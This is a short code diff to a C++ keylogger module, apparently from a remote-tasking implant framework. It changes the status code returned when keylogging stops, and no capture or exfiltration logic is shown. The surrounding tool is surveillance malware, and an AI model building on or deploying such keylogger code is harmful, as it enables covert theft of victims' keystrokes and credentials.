@@ -207,7 +207,7 @@ Response Keylogger::get_keylog_data(const int &taskID)
         current_window.clear();
         last_window = NULL;
     }
-    return CreateTaskResponse(taskID, KEYLOGGER_STOP, NO_CODE, SUCCESS,
+    return CreateTaskResponse(taskID, KEYLOGGER_STOP, NO_CODE, KEYLOGGER_STATUS,
                               TaskSuccess{result});
 }
 
